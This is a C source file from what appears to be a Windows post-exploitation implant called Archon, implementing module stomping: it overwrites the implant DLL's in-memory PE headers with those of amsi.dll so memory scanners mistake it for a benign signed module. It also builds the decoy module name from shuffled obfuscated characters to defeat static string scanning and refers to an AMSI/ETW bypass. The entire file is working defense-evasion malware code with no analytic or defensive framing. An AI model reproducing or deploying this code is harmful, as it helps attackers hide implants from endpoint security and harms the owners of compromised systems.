/*!
 * ARC-05: Module stomping for injected DLL payload
 *
 * Overwrites the PE headers of Archon's own loaded DLL with the headers of a
 * legitimate Windows DLL so that memory scanners see a signed, benign module
 * instead of the implant's MZ/PE signature.
 *
 * Technique:
 *   1. Resolve a decoy DLL (amsi.dll by default — small, ubiquitous, usually
 *      already loaded by the AMSI bypass path).
 *   2. Read the decoy's first page (DOS header + PE headers + section table).
 *   3. Make Archon's header page writable via NtProtectVirtualMemory.
 *   4. Copy the decoy headers over Archon's headers.
 *   5. Restore the original page protection.
 *
 * The stomped region is exactly one page (PAGE_SIZE, 0x1000 bytes).  This is
 * sufficient because PE headers and section tables always reside in the first
 * page of a mapped image.
 *
 * Architecture: the implementation is architecture-agnostic — the same code
 * compiles for both x64 and x86 without conditional blocks.
 */

#include <Demon.h>
#include <inject/ModuleStomp.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/SysNative.h>
#include <core/Runtime.h>
#include <common/Macros.h>

/* Standard PE page size — covers DOS header, PE signature, COFF header,
 * optional header, and section table for any reasonable DLL. */
#define HEADER_PAGE_SIZE  0x1000

/*!
 * Load the decoy DLL into the current process (or find it if already loaded)
 * and return its base address.
 *
 * Uses the same obfuscated-string pattern as RtAmsi() to avoid leaving
 * cleartext module names in the binary.
 */
static PVOID LoadDecoyModule( VOID )
{
    PVOID DecoyBase = NULL;

    /* Try amsi.dll first — it may already be loaded by AmsiEtwBypassPatch */
    if ( Instance->Modules.Amsi ) {
        return Instance->Modules.Amsi;
    }

    /* Load amsi.dll using obfuscated name construction (same pattern as
     * RtAmsi in Runtime.c).  Character order is shuffled to defeat static
     * string scanning. */
    {
        CHAR ModuleName[ 9 ] = { 0 };

        ModuleName[ 3 ] = HideChar( 'I' );
        ModuleName[ 5 ] = HideChar( 'D' );
        ModuleName[ 7 ] = HideChar( 'L' );
        ModuleName[ 8 ] = HideChar( 0 );
        ModuleName[ 6 ] = HideChar( 'L' );
        ModuleName[ 4 ] = HideChar( '.' );
        ModuleName[ 0 ] = HideChar( 'A' );
        ModuleName[ 1 ] = HideChar( 'M' );
        ModuleName[ 2 ] = HideChar( 'S' );

        DecoyBase = LdrModuleLoad( ModuleName );
        MemZero( ModuleName, sizeof( ModuleName ) );
    }

    if ( DecoyBase ) {
        PUTS( "[MSTOMP] decoy module loaded (amsi.dll)" )
    } else {
        PUTS( "[MSTOMP] failed to load decoy module" )
    }

    return DecoyBase;
}

/*!
 * Validate that a pointer looks like a valid PE image by checking the
 * MZ signature and the PE signature offset.
 */
static BOOL IsValidPe( IN PVOID Base )
{
    PIMAGE_DOS_HEADER Dos = NULL;
    PIMAGE_NT_HEADERS Nt  = NULL;

    if ( ! Base ) {
        return FALSE;
    }

    Dos = (PIMAGE_DOS_HEADER) Base;
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE ) {
        return FALSE;
    }

    /* Sanity: e_lfanew must point within the first page */
    if ( Dos->e_lfanew <= 0 || Dos->e_lfanew >= HEADER_PAGE_SIZE - sizeof( DWORD ) ) {
        return FALSE;
    }

    Nt = RVA( PIMAGE_NT_HEADERS, Base, Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE ) {
        return FALSE;
    }

    return TRUE;
}

NTSTATUS ModuleStompHeaders( VOID )
{
    PVOID    ModuleBase  = NULL;
    PVOID    DecoyBase   = NULL;
    PVOID    Base        = NULL;
    SIZE_T   RegionSize  = HEADER_PAGE_SIZE;
    ULONG    OldProt     = 0;
    ULONG    Dummy       = 0;
    NTSTATUS Status      = STATUS_SUCCESS;

    ModuleBase = Instance->Session.ModuleBase;

    if ( ! ModuleBase ) {
        PUTS( "[MSTOMP] ModuleBase is NULL — cannot stomp headers" )
        return STATUS_INVALID_PARAMETER;
    }

    /* Validate that our own module has valid PE headers before stomping */
    if ( ! IsValidPe( ModuleBase ) ) {
        PUTS( "[MSTOMP] ModuleBase does not have valid PE headers" )
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    /* ------------------------------------------------------------------ */
    /* 1. Load or locate the decoy DLL                                    */
    /* ------------------------------------------------------------------ */
    DecoyBase = LoadDecoyModule();
    if ( ! DecoyBase ) {
        PUTS( "[MSTOMP] no decoy module available — aborting header stomp" )
        return STATUS_NOT_FOUND;
    }

    /* Validate that the decoy has valid PE headers */
    if ( ! IsValidPe( DecoyBase ) ) {
        PUTS( "[MSTOMP] decoy module has invalid PE headers" )
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    PRINTF( "[MSTOMP] stomping headers at %p with decoy from %p\n",
            ModuleBase, DecoyBase )

    /* ------------------------------------------------------------------ */
    /* 2. Make our module's header page writable                          */
    /* ------------------------------------------------------------------ */
    Base = ModuleBase;
    Status = SysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID*) &Base,
        &RegionSize,
        PAGE_READWRITE,
        &OldProt
    );
    if ( ! NT_SUCCESS( Status ) ) {
        PRINTF( "[MSTOMP] NtProtectVirtualMemory(RW) failed: %08x\n", Status )
        return Status;
    }

    /* ------------------------------------------------------------------ */
    /* 3. Overwrite our headers with the decoy's headers                  */
    /* ------------------------------------------------------------------ */
    MemCopy( ModuleBase, DecoyBase, HEADER_PAGE_SIZE );

    PUTS( "[MSTOMP] headers stomped successfully" )

    /* ------------------------------------------------------------------ */
    /* 4. Restore original page protection                                */
    /* ------------------------------------------------------------------ */
    Base       = ModuleBase;
    RegionSize = HEADER_PAGE_SIZE;
    Status = SysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID*) &Base,
        &RegionSize,
        OldProt,
        &Dummy
    );
    if ( ! NT_SUCCESS( Status ) ) {
        /* Non-fatal: the stomp already succeeded, the page just has
         * slightly wrong protection.  Log but do not fail. */
        PRINTF( "[MSTOMP] NtProtectVirtualMemory(restore) failed: %08x\n", Status )
    }

    return STATUS_SUCCESS;
}
